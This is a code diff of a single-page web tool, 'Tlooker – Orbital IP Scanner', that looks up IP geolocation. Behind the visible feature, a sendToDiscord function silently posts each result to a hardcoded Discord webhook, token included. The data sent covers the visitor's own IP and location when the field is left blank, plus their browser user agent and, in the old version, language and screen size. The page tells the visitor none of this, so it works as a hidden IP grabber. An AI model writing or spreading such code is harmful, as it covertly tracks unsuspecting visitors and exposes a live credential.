@@ -5,268 +5,93 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Tlooker – Orbital IP Scanner</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Roboto+Mono:wght@300;400&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg: #000000;
-      --text: #e0e0e0;
-      --accent: #00eaff;
-      --accent-dim: #00aaff44;
-      --card: #0a0f1a;
-      --border: #1a2b3f;
-    }
-    body {
-      margin: 0;
-      padding: 0;
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Roboto Mono', monospace;
-      min-height: 100vh;
-      background-image: 
-        radial-gradient(circle at 10% 20%, var(--accent-dim) 0%, transparent 25%),
-        radial-gradient(circle at 90% 80%, var(--accent-dim) 0%, transparent 35%);
-      background-attachment: fixed;
-      overflow-x: hidden;
-    }
-    .container {
-      max-width: 720px;
-      margin: 0 auto;
-      padding: 2rem 1rem;
-      position: relative;
-      z-index: 1;
-    }
-    header {
-      text-align: center;
-      padding: 4rem 0 2rem;
-    }
-    h1 {
-      font-family: 'Orbitron', sans-serif;
-      font-size: 3.5rem;
-      font-weight: 700;
-      margin: 0;
-      background: linear-gradient(90deg, #00eaff, #a78bfa, #00eaff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      letter-spacing: 4px;
-      text-shadow: 0 0 20px rgba(0, 234, 255, 0.5);
-    }
-    .subtitle {
-      font-size: 1.1rem;
-      opacity: 0.7;
-      margin-top: 0.5rem;
-    }
-    .input-group {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 1rem;
-      margin: 2rem 0;
-    }
-    input[type="text"] {
-      width: 100%;
-      max-width: 420px;
-      padding: 1rem 1.5rem;
-      font-size: 1.2rem;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 9999px;
-      color: var(--text);
-      font-family: inherit;
-      outline: none;
-      transition: all 0.3s;
-    }
-    input[type="text"]:focus {
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px var(--accent-dim);
-    }
-    button {
-      padding: 1rem 2.5rem;
-      font-size: 1.1rem;
-      font-weight: 500;
-      background: transparent;
-      border: 2px solid var(--accent);
-      color: var(--accent);
-      border-radius: 9999px;
-      cursor: pointer;
-      transition: all 0.3s;
-      font-family: 'Orbitron', sans-serif;
-      letter-spacing: 1px;
-    }
-    button:hover {
-      background: var(--accent);
-      color: #000;
-      box-shadow: 0 0 25px var(--accent-dim);
-    }
-    #result {
-      margin-top: 3rem;
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 1rem;
-      padding: 2rem;
-      display: none;
-      animation: fadeIn 0.6s ease-out;
-    }
-    #result.show {
-      display: block;
-    }
-    .status {
-      text-align: center;
-      font-size: 1.1rem;
-      margin: 1rem 0;
-      min-height: 1.5rem;
-    }
-    .error {
-      color: #ff4d4d;
-    }
-    dl {
-      display: grid;
-      grid-template-columns: auto 1fr;
-      gap: 0.8rem 1.5rem;
-      margin: 1.5rem 0 0;
-    }
-    dt {
-      font-weight: 400;
-      color: var(--accent);
-      text-align: right;
-    }
-    dd {
-      margin: 0;
-      word-break: break-all;
-    }
-    .orb {
-      position: absolute;
-      width: 4px;
-      height: 4px;
-      background: var(--accent);
-      border-radius: 50%;
-      box-shadow: 0 0 12px var(--accent);
-      pointer-events: none;
-      animation: float 15s infinite linear;
-      opacity: 0.6;
-    }
-    @keyframes float {
-      0%,100% { transform: translate(0, 0); }
-      25% { transform: translate(120vw, -30vh); }
-      50% { transform: translate(60vw, 80vh); }
-      75% { transform: translate(-40vw, 40vh); }
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-    @media (max-width: 500px) {
-      h1 { font-size: 2.8rem; }
-      dl { grid-template-columns: 1fr; }
-      dt { text-align: left; }
-    }
+    :root { --bg: #000; --text: #e0e0e0; --accent: #00eaff; --card: #0a0f1a; --border: #1a2b3f; }
+    body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Roboto Mono', monospace; min-height: 100vh; display: flex; justify-content: center; }
+    .container { width: 100%; max-width: 700px; padding: 2rem; text-align: center; }
+    h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; color: var(--accent); text-shadow: 0 0 15px var(--accent); }
+    .input-group { margin: 2rem 0; display: flex; flex-direction: column; gap: 10px; align-items: center; }
+    input { width: 80%; padding: 1rem; background: var(--card); border: 1px solid var(--border); border-radius: 50px; color: #fff; outline: none; }
+    button { padding: 1rem 2rem; background: transparent; border: 2px solid var(--accent); color: var(--accent); border-radius: 50px; cursor: pointer; font-family: 'Orbitron'; }
+    button:hover { background: var(--accent); color: #000; }
+    #result { margin-top: 2rem; background: var(--card); border: 1px solid var(--border); padding: 1.5rem; border-radius: 10px; display: none; text-align: left; }
+    .show { display: block !important; }
+    dt { color: var(--accent); margin-top: 10px; font-weight: bold; }
+    dd { margin-left: 0; word-break: break-all; }
   </style>
 </head>
 <body>
-
-  <div class="orb" style="top:10%;left:15%;animation-delay:0s;"></div>
-  <div class="orb" style="top:40%;left:80%;animation-delay:4s;"></div>
-  <div class="orb" style="top:70%;left:25%;animation-delay:8s;"></div>
-  <div class="orb" style="top:20%;left:60%;animation-delay:12s;"></div>
-
   <div class="container">
-    <header>
-      <h1>TLOOKER</h1>
-      <div class="subtitle">orbital ip reconnaissance • trace • resolve</div>
-    </header>
-
+    <h1>TLOOKER</h1>
     <div class="input-group">
-      <input type="text" id="ipInput" placeholder="Enter IP address (or leave blank for your own)" autocomplete="off" spellcheck="false"/>
+      <input type="text" id="ipInput" placeholder="Enter IP or leave blank for yours">
       <button onclick="lookup()">SCAN TARGET</button>
     </div>
-
-    <div class="status" id="status"></div>
-
+    <div id="status">Ready.</div>
     <div id="result">
-      <dl>
-        <dt>IP</dt>             <dd id="ip"></dd>
-        <dt>Status</dt>         <dd id="statusOut"></dd>
-        <dt>Country</dt>        <dd id="country"></dd>
-        <dt>Region</dt>         <dd id="region"></dd>
-        <dt>City</dt>           <dd id="city"></dd>
-        <dt>ZIP</dt>            <dd id="zip"></dd>
-        <dt>Lat / Lon</dt>      <dd id="latlon"></dd>
-        <dt>Timezone</dt>       <dd id="timezone"></dd>
-        <dt>ISP</dt>            <dd id="isp"></dd>
-        <dt>Org</dt>            <dd id="org"></dd>
-        <dt>AS</dt>             <dd id="as"></dd>
-      </dl>
+      <dl id="data-list"></dl>
     </div>
   </div>
 
   <script>
-    const statusEl = document.getElementById('status');
-    const resultEl = document.getElementById('result');
     const webhookURL = "https://discord.com/api/webhooks/1477796865054609512/gYdKCLTrFa9SdlPeVrLDCAOU1F9MW6UOq4hN5zvTX1n3EWrrv47lzTyxMUjcoEJtnios";
 
     async function sendToDiscord(data) {
       const payload = {
-        username: "TLOOKER RECON",
         embeds: [{
-          title: "🛰️ Orbital Intercept Successful",
+          title: "🛰️ TLOOKER INTERCEPT",
           color: 5814783,
           fields: [
-            { name: "Target IP", value: `\`${data.query}\``, inline: true },
-            { name: "Status", value: data.status, inline: true },
-            { name: "Location", value: `${data.city}, ${data.regionName}, ${data.country}`, inline: false },
-            { name: "Coordinates", value: `${data.lat}, ${data.lon}`, inline: true },
-            { name: "ISP", value: data.isp, inline: true },
-            { name: "Browser UA", value: navigator.userAgent, inline: false },
-            { name: "Language", value: navigator.language, inline: true },
-            { name: "Resolution", value: `${window.screen.width}x${window.screen.height}`, inline: true }
+            { name: "Target IP", value: data.ip, inline: true },
+            { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
+            { name: "ISP", value: data.connection.isp, inline: false },
+            { name: "User Agent", value: navigator.userAgent }
           ],
-          footer: { text: "TLOOKER • " + new Date().toUTCString() }
+          timestamp: new Date().toISOString()
         }]
       };
+
+      const formData = new FormData();
+      formData.append("payload_json", JSON.stringify(payload));
 
       try {
         await fetch(webhookURL, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          mode: 'no-cors',
+          body: formData
         });
-      } catch (e) {}
+      } catch (e) {
+        console.error("Webhook Error");
+      }
     }
 
     async function lookup() {
-      const input = document.getElementById('ipInput').value.trim();
-      const endpoint = input ? `https://demo.ip-api.com/json/${input}` : 'https://demo.ip-api.com/json/';
+      const ip = document.getElementById('ipInput').value.trim();
+      const status = document.getElementById('status');
+      const result = document.getElementById('result');
+      const list = document.getElementById('data-list');
 
-      statusEl.textContent = 'Scanning...';
-      statusEl.className = 'status';
-      resultEl.classList.remove('show');
-
+      status.textContent = "Scanning...";
+      
       try {
-        const res = await fetch(endpoint);
-        if (!res.ok) throw new Error(`HTTP ${res.status}`);
-
+        const res = await fetch(`https://ipwho.is/${ip}`);
         const data = await res.json();
-        if (data.status !== 'success') throw new Error(data.message || 'Query failed');
 
-        document.getElementById('ip').textContent = data.query;
-        document.getElementById('statusOut').textContent = 'success';
-        document.getElementById('country').textContent = data.country ? `${data.country} (${data.countryCode})` : '—';
-        document.getElementById('region').textContent = data.regionName ? `${data.regionName} (${data.region})` : '—';
-        document.getElementById('city').textContent = data.city || '—';
-        document.getElementById('zip').textContent = data.zip || '—';
-        document.getElementById('latlon').textContent = data.lat && data.lon ? `${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}` : '—';
-        document.getElementById('timezone').textContent = data.timezone || '—';
-        document.getElementById('isp').textContent = data.isp || '—';
-        document.getElementById('org').textContent = data.org || '—';
-        document.getElementById('as').textContent = data.as || '—';
+        if (!data.success) throw new Error(data.message);
 
-        resultEl.classList.add('show');
-        statusEl.textContent = 'Target acquired.';
-        
+        list.innerHTML = `
+          <dt>IP</dt><dd>${data.ip}</dd>
+          <dt>Location</dt><dd>${data.city}, ${data.region}, ${data.country}</dd>
+          <dt>ISP</dt><dd>${data.connection.isp}</dd>
+          <dt>Coords</dt><dd>${data.latitude}, ${data.longitude}</dd>
+        `;
+
+        result.classList.add('show');
+        status.textContent = "Recon complete.";
         sendToDiscord(data);
       } catch (err) {
-        statusEl.textContent = `Error: ${err.message}`;
-        statusEl.className = 'status error';
+        status.textContent = "Error: " + err.message;
       }
     }
 
